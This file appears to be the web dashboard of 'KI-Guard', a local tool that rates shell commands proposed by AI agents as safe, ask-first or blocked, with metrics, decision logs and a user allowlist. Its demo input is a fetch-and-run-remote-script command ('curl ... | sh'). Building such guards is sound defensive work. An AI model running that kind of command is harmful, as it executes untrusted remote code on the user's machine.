<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>KI-Guard</title>
<style>
:root{--txt:#1d1d1f;--ink:#1d1d1f;--sub:rgba(0,0,0,.52);--tint:rgba(0,0,0,.04);--card:rgba(255,255,255,.55);--foot:rgba(0,0,0,.05);--hov:rgba(0,0,0,.08);
--edge:linear-gradient(180deg,rgba(255,255,255,.95) 0%,rgba(255,255,255,.6) 20%,rgba(0,0,0,.07) 35%,rgba(0,0,0,.05) 65%,rgba(255,255,255,.6) 80%,rgba(255,255,255,.95) 100%);
--b0:#1d1d1f;--b1:#48484d;--b2:#76767b;--b3:#a1a1a6;--b4:#c7c7cc}
*{box-sizing:border-box}
body{margin:0;min-height:100vh;color:var(--txt);font:13px/1.45 "Segoe UI Variable","Segoe UI",Inter,system-ui,sans-serif}
.card,.btn,.chip,.field{position:relative;isolation:isolate}
.card::before,.btn::before,.chip::before,.field::before{content:"";position:absolute;inset:0;border-radius:inherit;padding:1px;background:var(--edge);-webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);-webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none}
.wrap{max-width:980px;margin:0 auto;padding:28px 16px;display:grid;gap:14px}
.card{box-shadow:0 10px 40px rgba(0,0,0,.06),0 1px 2px rgba(0,0,0,.04);background:var(--card);backdrop-filter:blur(5px) saturate(1.3);-webkit-backdrop-filter:blur(5px) saturate(1.3);border-radius:26px;padding:18px}
h1{margin:0;font-size:20px;font-weight:600;letter-spacing:.02em}h2{margin:0 0 10px;font-size:12px;font-weight:600;color:var(--sub);text-transform:uppercase;letter-spacing:.12em}
.sub{color:var(--sub)}
.top{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
.row{display:grid;grid-template-columns:260px 1fr;gap:14px}
@media(max-width:760px){.row{grid-template-columns:1fr}}
.tiles{display:grid;grid-template-columns:repeat(5,1fr);gap:10px}
@media(max-width:760px){.tiles{grid-template-columns:repeat(2,1fr)}}
.tile{background:rgba(0,0,0,.04);border-radius:18px;padding:12px 14px;cursor:pointer;transition:transform .1s,background .1s}
.tile:hover{transform:scale(1.05);background:var(--hov)}.tile:active{transform:scale(.95)}
.tile.on{background:rgba(0,0,0,.14)}
.tile b{display:block;font-size:26px;font-weight:600;line-height:1.1}
.dot{display:inline-block;width:9px;height:9px;border-radius:50%;margin-right:6px;vertical-align:1px;border:1px solid rgba(0,0,0,.35)}
.btn{border:0;color:var(--txt);font:inherit;cursor:pointer;background:var(--foot);border-radius:15px;padding:7px 14px;transition:background .1s,transform .1s}
.btn:hover{background:var(--hov);transform:scale(1.05)}.btn:active{transform:scale(.95)}
.btn.s{padding:4px 10px;font-size:12px;border-radius:12px}
.chip{display:inline-flex;align-items:center;gap:6px;background:var(--foot);border-radius:14px;padding:4px 6px 4px 12px;margin:0 6px 6px 0;font-family:Consolas,monospace;font-size:12px}
.chip button{border:0;background:transparent;color:var(--sub);cursor:pointer;font-size:14px;border-radius:10px;width:22px;height:22px}.chip button:hover{background:var(--hov);color:var(--ink)}
.field{width:100%;border:0;outline:0;color:var(--txt);font:12px Consolas,monospace;background:rgba(0,0,0,.045);border-radius:14px;padding:9px 12px}
.list{display:grid;gap:6px;max-height:340px;overflow:auto;padding-right:4px}
.item{display:grid;grid-template-columns:96px 1fr auto;gap:10px;align-items:center;background:rgba(0,0,0,.035);border-radius:14px;padding:7px 10px}
.item code{font:12px Consolas,monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.tag{font-size:11px;border-radius:10px;padding:2px 8px;background:rgba(0,0,0,.08);text-align:center}
svg text{fill:var(--txt);font:12px "Segoe UI",sans-serif}
#tip{position:fixed;pointer-events:none;background:rgba(255,255,255,.82);color:#1d1d1f;box-shadow:0 8px 30px rgba(0,0,0,.12);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border-radius:12px;padding:7px 11px;font-size:12px;opacity:0;transition:opacity .1s;z-index:9;max-width:320px;border:1px solid rgba(0,0,0,.14)}
.bracket{position:absolute;width:12px;height:12px;border:1px solid rgba(0,0,0,.4)}
.empty{color:var(--sub);padding:18px;text-align:center}
/* Simple view: big, calm, one question */
html{background:#fff}body{background:radial-gradient(900px 600px at 15% 0%,#eef0f4 0%,transparent 60%),radial-gradient(800px 600px at 100% 100%,#f1eff4 0%,transparent 60%),#fff}[hidden]{display:none!important}
.simple{max-width:640px;margin:0 auto;padding:56px 16px 8px;display:grid;gap:18px}
.hero{border-radius:56px;padding:44px 40px 40px;text-align:center}
.logo{display:inline-flex;align-items:center;gap:10px;font-size:22px;font-weight:600;letter-spacing:.01em}
.big{font-size:44px;font-weight:300;letter-spacing:-.01em;margin:22px 0 28px;line-height:1.1}
.bigin{width:100%;height:64px;border:0;outline:0;color:var(--txt);font:19px Consolas,monospace;background:rgba(0,0,0,.045);border-radius:22px;padding:0 22px}
.bigbtn{width:100%;height:64px;margin-top:14px;border:0;border-radius:22px;font:600 20px "Segoe UI Variable","Segoe UI",sans-serif;color:#fff;background:#1d1d1f;cursor:pointer;transition:transform .1s}
.bigbtn:hover{transform:scale(1.03)}.bigbtn:active{transform:scale(.95)}
.answer{border-radius:56px;padding:34px 40px;display:grid;grid-template-columns:96px 1fr;gap:24px;align-items:center}
.answer .ico{width:96px;height:96px;border-radius:50%;display:grid;place-items:center;background:rgba(0,0,0,.12)}
.answer .word{font-size:40px;font-weight:600;line-height:1.05}
.answer .say{font-size:19px;color:rgba(0,0,0,.78);margin-top:8px}
.three{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
.three .card{border-radius:40px;padding:26px 18px;text-align:center}
.three b{display:block;font-size:46px;font-weight:300;line-height:1}
.three span{display:block;font-size:17px;color:rgba(0,0,0,.75);margin-top:10px}
.more{justify-self:center;font-size:17px;padding:14px 30px;border-radius:26px}
@media(max-width:560px){.big{font-size:34px}.answer{grid-template-columns:1fr;text-align:center}.answer .ico{margin:0 auto}.three b{font-size:34px}.hero{padding:34px 20px}}
</style></head><body>
<div class="simple">
  <div class="card hero">
    <div class="logo"><svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="var(--ink)" stroke-width="1.8"><path d="M12 2.5 4 5.5v6c0 5 3.4 8.6 8 10 4.6-1.4 8-5 8-10v-6z"/></svg>KI-Guard</div>
    <div class="big">Is this safe to run?</div>
    <input class="bigin" id="try" placeholder="Paste a command here" value="curl http://example.com/x.sh | sh">
    <button class="bigbtn" id="go">Check</button>
  </div>
  <div class="card answer" id="answer" hidden></div>
  <div class="three" id="three"></div>
  <button class="btn more" id="more">Show details</button>
</div>
<div class="wrap" id="expert" hidden>
  <div class="card top">
    <div><h1>Details</h1><div class="sub">Local guard for every AI agent · <span id="total">0</span> decisions logged</div></div>
    <div><button class="btn" id="reload">Refresh</button></div>
  </div>

  <div class="card"><h2>How it decided</h2>
    <div id="tryout"></div>
  </div>

  <div class="card"><div class="top" style="margin-bottom:12px"><h2 style="margin:0">Decision mode</h2><div id="modes"></div></div><div class="tiles" id="tiles"></div></div>

  <div class="row">
    <div class="card"><h2>Share</h2><svg id="ring" viewBox="0 0 220 220" width="100%"></svg></div>
    <div class="card"><h2>Per day</h2><svg id="days" viewBox="0 0 640 220" width="100%"></svg></div>
  </div>

  <div class="row">
    <div class="card"><h2>Per AI</h2><svg id="agents" viewBox="0 0 240 200" width="100%"></svg></div>
    <div class="card"><h2>Models in the backend</h2><div id="backend"></div></div>
  </div>

  <div class="card"><h2>Eval harness · CLI Command Risk <span class="sub" id="hsplit"></span></h2>
    <div id="hpills" style="margin-bottom:10px"></div>
    <div id="harness"></div>
    <div class="sub" id="hnote" style="font-size:11px;margin-top:8px"></div>
  </div>

  <div class="card"><h2>Recent decisions <span class="sub" id="filt"></span></h2><div class="list" id="recent"></div></div>

  <div class="card"><h2>Your allowlist</h2>
    <div id="allow"></div>
    <div style="display:flex;gap:8px;margin-top:6px"><input class="field" id="pat" placeholder="regex, e.g.  ^git push --force origin my-branch$"><button class="btn" id="add">Add</button></div>
  </div>
</div>
<div id="tip"></div>
<script>
const B = [['blocked','Blocked','var(--b0)'],['likely','Likely risky','var(--b1)'],['unsure','Unsure','var(--b2)'],['safe','Safe','var(--b3)'],['yours','Allowed by you','var(--b4)']];
const vs = typeof acquireVsCodeApi === 'function' ? acquireVsCodeApi() : null;
let D = null, filter = null;
const $ = id => document.getElementById(id);
const esc = s => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
const tip = $('tip');
document.addEventListener('mousemove', e => { const t = e.target.closest('[data-tip]'); if (!t) { tip.style.opacity = 0; return; }
  tip.innerHTML = t.dataset.tip; tip.style.opacity = 1; tip.style.left = Math.min(innerWidth - 330, e.clientX + 14) + 'px'; tip.style.top = (e.clientY + 14) + 'px'; });

function load() { if (vs) vs.postMessage({ type: 'stats' }); else fetch('/api/stats').then(r => r.json()).then(render); }
function saveAllow(p) { if (vs) vs.postMessage({ type: 'allow', patterns: p }); else fetch('/api/allow', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ patterns: p }) }).then(load); }
window.addEventListener('message', e => { if (e.data && e.data.type === 'stats') render(e.data.data); });

function render(d) {
  D = d; $('total').textContent = d.total;
  const bk = d.buckets, T = [['Stopped', bk.blocked, 'Blocked before it could run'], ['Asked you', bk.likely + bk.unsure, 'Looked risky, so it asked first'], ['Let through', bk.safe + bk.yours, 'Harmless, or allowed by you']];
  $('three').innerHTML = T.map(([n, v, h]) => `<div class="card" data-tip="<b>${n}</b><br>${h}<br>${v} of ${d.total}"><b>${v}</b><span>${n}</span></div>`).join('');
  const pct = k => d.total ? (100 * d.buckets[k] / d.total).toFixed(1) + ' %' : '–';
  $('tiles').innerHTML = B.map(([k, n, c]) => `<div class="tile ${filter === k ? 'on' : ''}" data-k="${k}" data-tip="<b>${n}</b><br>${d.buckets[k]} of ${d.total} · ${pct(k)}<br><span class=sub>click to filter the list</span>"><span class="dot" style="background:${c}"></span><span class="sub">${n}</span><b>${d.buckets[k]}</b></div>`).join('');
  document.querySelectorAll('.tile').forEach(t => t.onclick = () => { filter = filter === t.dataset.k ? null : t.dataset.k; render(D); });
  if (d.models) { MODELS = d.models; mode = d.mode || 'auto'; modes(); }
  ring(d); days(d); agents(d); recent(d); allow(d); backendCard(d); harness(d);
}

const api = (u, b) => fetch(u, b ? { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(b) } : undefined).then(r => r.json());
// Models come from the Python backend (GET /v1/models). "auto" = the backend's default model.
let mode = 'auto', MODELS = { data: [], default: null };
const info = k => MODELS.data.find(x => x.name === k) || null;
const mlabel = k => k === 'auto' ? `Auto · ${MODELS.default || 'backend default'}` : k;
function modes() { const ks = ['auto', ...MODELS.data.map(x => x.name)];
  $('modes').innerHTML = ks.map(k => `<button class="btn s" data-m="${esc(k)}" style="margin-left:6px;${mode === k ? 'background:rgba(0,0,0,.24)' : ''}" data-tip="Decide with ${esc(mlabel(k))}">${esc(mlabel(k))}</button>`).join('');
  document.querySelectorAll('[data-m]').forEach(b => b.onclick = () => api('/api/settings', { mode: b.dataset.m }).then(() => { mode = b.dataset.m; modes(); tryIt(); })); }

const VERB = { allow: ['Allowed', 'var(--b3)'], ask: ['Ask a person', 'var(--b1)'], block: ['Blocked', 'var(--b0)'] };
function tryIt() {
  const c = $('try').value.trim(); if (!c) return;
  api('/api/check', { command: c }).then(r => {
    const ids = Object.keys(r.models || {});
    const bar = (id, used) => { const p = r.models[id].p, pol = info(id), ok = pol && pol.evaluated;
      const marks = ok && pol.confidence < 1 ? `<span style="position:absolute;top:-3px;bottom:-3px;left:${pol.allow_at_or_below * 100}%;width:1px;background:rgba(0,0,0,.5)"></span><span style="position:absolute;top:-3px;bottom:-3px;left:${pol.risky_at_or_above * 100}%;width:2px;background:var(--ink)"></span>` : '';
      const note = !pol ? '' : !ok ? 'not evaluated' : pol.confidence >= 1 ? 'no cut-off' : `allow ≤ ${(pol.allow_at_or_below * 100).toFixed(1)} %`;
      const tipText = `<b>${esc(id)}</b><br>risk ${(p * 100).toFixed(2)} %<br>${r.models[id].ms.toFixed(2)} ms` + (ok && pol.confidence < 1 ? `<br>allows at or below ${(pol.allow_at_or_below * 100).toFixed(1)} %<br>risky at or above ${(pol.risky_at_or_above * 100).toFixed(1)} %<br><span class=sub>cut-offs from the eval harness, validation split</span>` : pol ? `<br><span class=sub>${esc(ok ? 'No cut-off keeps it within the error budget, so it always asks' : pol.why)}</span>` : '');
      return `<div style="display:grid;grid-template-columns:150px 1fr 64px 110px;gap:10px;align-items:center;margin:5px 0" data-tip="${esc(tipText)}">
      <span class="${used ? '' : 'sub'}" style="${used ? 'font-weight:600' : ''}">${esc(id)}${used ? ' · used' : ''}</span><span style="height:10px;border-radius:5px;background:rgba(0,0,0,.07);position:relative;overflow:hidden">
      <span style="position:absolute;inset:0 auto 0 0;width:${Math.max(1, p * 100)}%;background:${used ? 'var(--ink)' : 'var(--b2)'};border-radius:5px"></span>${marks}</span>
      <span>${(p * 100).toFixed(1)} %</span><span class="sub" style="font-size:11px">${note}</span></div>`; };
    const v = VERB[r.level];
    const ICO = { allow: '<path d="M5 12.5l4.5 4.5L19 7.5"/>', ask: '<path d="M9.2 9a3 3 0 1 1 3.8 2.9c-.6.2-1 .8-1 1.4V14"/><circle cx="12" cy="18" r=".6" fill="var(--ink)"/>', block: '<path d="M6 6l12 12M18 6 6 18"/>' };
    const WORD = { allow: 'Safe', ask: 'Ask first', block: 'Stopped' };
    const why = r.allowlisted ? 'You allowed this one yourself.' : r.offline ? 'The model backend is not running, so KI-Guard asks you first.' :
      r.policy && !r.policy.evaluated ? 'This model has not been evaluated yet, so KI-Guard asks you first.' :
      r.level === 'allow' ? 'Nothing risky found. The AI may run it.' : r.bucket === 'likely' ? 'Looks risky. KI-Guard asks you before it runs.' : 'Not sure. KI-Guard asks you before it runs.';
    $('answer').hidden = false;
    $('answer').innerHTML = `<div class="ico"><svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="var(--ink)" stroke-width="2" stroke-linecap="round">${ICO[r.level]}</svg></div>
      <div><div class="word">${WORD[r.level]}</div><div class="say">${esc(why)}</div></div>`;
    $('tryout').innerHTML = `<div style="display:flex;gap:14px;align-items:center;flex-wrap:wrap;margin-bottom:8px">
      <span class="tag" style="font-size:14px;padding:6px 14px;background:rgba(0,0,0,.14)"><span class="dot" style="background:${v[1]}"></span>${v[0]}</span>
      <span class="chip" style="padding-right:12px">root: ${r.traits.needs_root ? 'yes' : 'no'}</span><span class="chip" style="padding-right:12px">undo: ${r.traits.reversible ? 'possible' : 'no'}</span>
      ${r.rules && r.rules.length ? `<span class="chip" style="padding-right:12px">rules matched: ${esc(r.rules.join(', '))}</span>` : ''}
      ${r.allowlisted ? '<span class="chip" style="padding-right:12px">on your allowlist</span>' : ''}<span class="sub">${r.ms.toFixed(1)} ms</span></div>
      <div class="sub" style="margin-bottom:6px">${esc(r.reason || '')}</div>
      ${ids.map(id => bar(id, id === r.model)).join('')}`;
  });
}

// Which models the backend serves, and whether the eval harness has measured cut-offs for each.
function backendCard(d) {
  const m = d.models || { data: [] };
  if (m.offline) { $('backend').innerHTML = `<div class="empty">Model backend not reachable at ${esc(d.backend)}.<br>Start it in the repo root: <code>uv run --extra ml python -m cmdgate.engine</code><br>Until then every command is sent to you.</div>`; return; }
  const pc = v => v == null ? '–' : (v * 100).toFixed(1) + ' %';
  $('backend').innerHTML = `<div class="list" style="max-height:none">` + m.data.map(x => `<div class="item" style="grid-template-columns:90px 1fr auto" data-tip="${esc(x.evaluated ? `<b>${esc(x.name)}</b><br>accuracy ${pc(x.accuracy)}<br>decides alone on ${pc(x.automation_rate)} of commands at ${pc(x.error_budget)} errors<br><span class=sub>eval harness, ${esc(x.split)} split</span>` : `<b>${esc(x.name)}</b><br>${esc(x.why)}`)}">
    <span class="tag">${esc(x.name)}${x.name === m.default ? ' ★' : ''}</span>
    <span class="sub" style="font-size:12px">${x.members && x.members.length ? 'mean of ' + esc(x.members.join(', ')) + ' · ' : ''}${!x.evaluated ? 'not evaluated, asks every time' : x.confidence >= 1 ? 'evaluated, no safe cut-off, asks every time' : `allows ≤ ${pc(x.allow_at_or_below)} · risky ≥ ${pc(x.risky_at_or_above)}`}</span>
    <span style="font-size:12px">${x.evaluated ? pc(x.automation_rate) + ' automated' : ''}</span></div>`).join('') + `</div><div class="sub" style="font-size:11px;margin-top:8px">★ = backend default. Cut-offs come from the eval harness on the validation split.</div>`;
}
$('go').onclick = tryIt; $('try').onkeydown = e => { if (e.key === 'Enter') tryIt(); };


// Scores from the Python eval harness (results/<scorer>_<split>.json), one row per model, same rows for every model.
const HM = [['Accuracy', 'accuracy', 1, 'Share of commands on the right side of 50 %'],
  ['Automated at 5 % errors', 'automation_rate_at_5pct', 1, 'Share of commands the model can decide alone with at most 5 % of those decisions wrong'],
  ['Severe caught at 1 % false alarms', 'severe_recall_at_1pct_fpr', 1, 'Share of high and critical commands flagged when at most 1 % of safe ones are'],
  ['Ranking (AUC)', 'auroc', 1, 'Chance that a risky command scores above a harmless one'],
  ['Brier', 'brier', 0, 'Squared error of the probabilities, summed over yes and no. Lower is better'],
  ['Calibration error', 'ece', 0, 'Gap between the stated confidence and how often it is right. Lower is better']];
let hsplit = null;
function harness(d) {
  const all = d.harness || [];
  if (!all.length) { $('hsplit').textContent = ''; $('hpills').innerHTML = ''; $('hnote').textContent = '';
    $('harness').innerHTML = `<div class="empty">No harness results yet. Run <code>uv run --extra ml python -m cmdgate.evaluate --scorer ngram --split validation</code> in the repo root.</div>`; return; }
  const splits = [...new Set(all.map(r => r.split))];
  if (!splits.includes(hsplit)) hsplit = splits.includes('test') ? 'test' : splits[0];
  $('hpills').innerHTML = splits.length < 2 ? '' : splits.map(x => `<button class="btn s" data-hs="${esc(x)}" style="margin:0 6px 6px 0;${x === hsplit ? 'background:rgba(0,0,0,.22)' : ''}">${esc(x)}</button>`).join('');
  document.querySelectorAll('[data-hs]').forEach(b => b.onclick = () => { hsplit = b.dataset.hs; harness(D); });
  const runs = all.filter(r => r.split === hsplit).sort((a, b) => (b.metrics.automation_rate_at_5pct ?? 0) - (a.metrics.automation_rate_at_5pct ?? 0));
  const fmt = (k, v) => v == null || Number.isNaN(v) ? '–' : k === 'brier' || k === 'ece' || k === 'auroc' ? v.toFixed(3) : (v * 100).toFixed(1) + ' %';
  const cell = (r, [n, k, up, hint]) => { const v = r.metrics[k], g = r.ranges[k];
    const best = runs.every(o => o.metrics[k] == null || (up ? o.metrics[k] <= v : o.metrics[k] >= v));
    const w = v == null ? 0 : Math.max(2, 100 * (up ? v : Math.max(0, 1 - v * (k === 'ece' ? 5 : 2))));
    const tipText = `<b>${esc(r.scorer)}</b><br>${n}: ${fmt(k, v)}` + (g ? `<br>95 % range ${fmt(k, g[0])} to ${fmt(k, g[1])}<br><span class=sub>whole template families resampled</span>` : '') + `<br><span class=sub>${hint}</span>`;
    return `<td data-tip="${esc(tipText)}"><div style="font-weight:${best ? 600 : 400}">${fmt(k, v)}</div><div style="height:4px;border-radius:2px;background:rgba(0,0,0,.06);margin-top:3px"><div style="height:4px;border-radius:2px;width:${w}%;background:${best ? 'var(--b0)' : 'var(--b3)'}"></div></div></td>`; };
  $('harness').innerHTML = `<div style="overflow-x:auto"><table style="width:100%;border-collapse:separate;border-spacing:10px 8px;min-width:720px"><thead><tr><th style="text-align:left;font-weight:400" class="sub">Model</th>` +
    HM.map(([n, , up]) => `<th style="text-align:left;font-weight:400;font-size:11px" class="sub">${n}${up ? '' : ' ↓'}</th>`).join('') + `</tr></thead><tbody>` +
    runs.map(r => `<tr><td data-tip="${esc(`<b>${esc(r.scorer)}</b><br>${r.source === 'endpoint' ? 'scored over the decision API' : 'scored in the harness process'}` + (r.ms_per_command != null ? `<br>${r.ms_per_command.toFixed(2)} ms per command` : '') + (r.failed ? `<br>${r.failed} requests failed` : ''))}"><b>${esc(r.scorer)}</b>${r.failed ? ` <span class="tag">${r.failed} failed</span>` : ''}</td>` + HM.map(m => cell(r, m)).join('') + `</tr>`).join('') + `</tbody></table></div>`;
  const first = runs[0], when = runs.map(r => r.scored_at).sort().pop();
  $('hsplit').textContent = `· ${hsplit} split`;
  $('hnote').textContent = (first.commands ? `${first.commands} commands in ${first.families} template families. ` : '') + `Written by cmdgate.evaluate, last run ${when.slice(0, 16).replace('T', ' ')} UTC. Bold = best in column. Hover a value for its 95 % range.`;
}

function ring(d) {
  const cx = 110, cy = 110, r = 80, C = 2 * Math.PI * r; let off = 0, s = '';
  s += `<circle cx="${cx}" cy="${cy}" r="${r}" fill="none" stroke="rgba(0,0,0,.06)" stroke-width="22"/>`;
  for (const [k, n, c] of B) { const v = d.total ? d.buckets[k] / d.total : 0; if (!v) continue;
    s += `<circle cx="${cx}" cy="${cy}" r="${r}" fill="none" stroke="${c}" stroke-width="22" stroke-dasharray="${v * C} ${C}" stroke-dashoffset="${-off}" transform="rotate(-90 ${cx} ${cy})" data-tip="<b>${n}</b><br>${d.buckets[k]} · ${(v * 100).toFixed(1)} %" style="cursor:pointer"/>`; off += v * C; }
  const stopped = d.buckets.blocked + d.buckets.likely + d.buckets.unsure;
  s += `<text x="${cx}" y="${cy - 4}" text-anchor="middle" style="font-size:30px;font-weight:600">${stopped}</text><text x="${cx}" y="${cy + 18}" text-anchor="middle" style="fill:var(--sub)">stopped or asked</text>`;
  $('ring').innerHTML = s;
}

function stackBars(el, rows, W, H, labelW) {
  const max = Math.max(1, ...rows.map(r => B.reduce((a, [k]) => a + r.v[k], 0)));
  return rows;
}

function days(d) {
  const ks = Object.keys(d.days).filter(Boolean).sort().slice(-14), W = 640, H = 220, pad = 28;
  if (!ks.length) { $('days').innerHTML = `<text x="320" y="110" text-anchor="middle" style="fill:var(--sub)">No decisions yet</text>`; return; }
  const max = Math.max(1, ...ks.map(k => B.reduce((a, [b]) => a + d.days[k][b], 0)));
  const bw = Math.min(40, (W - pad * 2) / ks.length - 8); let s = '';
  ks.forEach((k, i) => { const x = pad + i * ((W - pad * 2) / ks.length) + 4; let y = H - pad;
    const tot = B.reduce((a, [b]) => a + d.days[k][b], 0);
    for (const [b, n, c] of B) { const h = (d.days[k][b] / max) * (H - pad * 2); if (!h) continue; y -= h;
      s += `<rect x="${x}" y="${y}" width="${bw}" height="${h}" rx="5" fill="${c}" data-tip="<b>${k}</b><br>${n}: ${d.days[k][b]} of ${tot}"/>`; }
    s += `<text x="${x + bw / 2}" y="${H - 8}" text-anchor="middle" style="fill:var(--sub);font-size:10px">${k.slice(5)}</text>`; });
  $('days').innerHTML = s;
}

function agents(d) {
  const ks = Object.keys(d.agents); let s = '';
  if (!ks.length) { $('agents').innerHTML = ''; return; }
  ks.slice(0, 6).forEach((a, i) => { const v = d.agents[a], tot = B.reduce((x, [b]) => x + v[b], 0); let x = 0; const y = 14 + i * 31;
    s += `<text x="0" y="${y}" style="font-size:11px">${esc(a)} <tspan style="fill:var(--sub)">· ${tot}</tspan></text>`;
    for (const [b, n, c] of B) { const w = (v[b] / tot) * 240; if (!w) continue; s += `<rect x="${x}" y="${y + 5}" width="${w}" height="9" rx="4" fill="${c}" data-tip="<b>${esc(a)}</b><br>${n}: ${v[b]} of ${tot}"/>`; x += w; } });
  $('agents').innerHTML = s;
}

function recent(d) {
  const r = d.recent.filter(e => !filter || e.bucket === filter);
  $('filt').textContent = filter ? '· ' + B.find(b => b[0] === filter)[1] : '';
  if (!r.length) { $('recent').innerHTML = `<div class="empty">Nothing here yet</div>`; return; }
  $('recent').innerHTML = r.map((e, i) => { const n = B.find(b => b[0] === e.bucket);
    return `<div class="item"><span class="tag" data-tip="${esc(n[1])}${e.p != null ? '<br>Model risk ' + (e.p * 100).toFixed(1) + ' %' : ''}<br>Rules: ${esc(e.hits.join(', ') || '–')}"><span class="dot" style="background:${n[2]}"></span>${n[1]}</span>
      <code data-tip="${esc(e.agent)} · ${esc(e.tool)} · ${esc((e.t || '').replace('T', ' ').slice(0, 19))}<br>${esc(e.text)}">${esc(e.text)}</code>
      ${['blocked', 'likely', 'unsure'].includes(e.bucket) ? `<button class="btn s" data-i="${i}" data-tip="Add this exact command to your allowlist">Allow</button>` : '<span></span>'}</div>`; }).join('');
  document.querySelectorAll('#recent [data-i]').forEach(b => b.onclick = () => {
    const t = r[+b.dataset.i].text; const p = '^' + t.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '$';
    if (!d.allow.includes(p)) saveAllow([...d.allow, p]); });
}

function allow(d) {
  $('allow').innerHTML = d.allow.length ? d.allow.map((p, i) => `<span class="chip">${esc(p)}<button data-i="${i}" data-tip="Remove">×</button></span>`).join('') : `<div class="sub" style="margin-bottom:8px">Nothing allowed yet. Click “Allow” on a decision or type a pattern.</div>`;
  document.querySelectorAll('#allow [data-i]').forEach(b => b.onclick = () => saveAllow(d.allow.filter((_, i) => i !== +b.dataset.i)));
}

$('add').onclick = () => { const v = $('pat').value.trim(); if (!v) return; try { new RegExp(v); } catch { $('pat').style.outline = '1px solid var(--ink)'; return; } $('pat').value = ''; saveAllow([...(D ? D.allow : []), v]); };
$('reload').onclick = load;
$('more').onclick = () => { const e = $('expert'); e.hidden = !e.hidden; $('more').textContent = e.hidden ? 'Show details' : 'Hide details'; if (!e.hidden && D) render(D); };
load(); setTimeout(tryIt, 300);
if (location.hash === '#details') setTimeout(() => $('more').click(), 600);
</script>
</body></html>
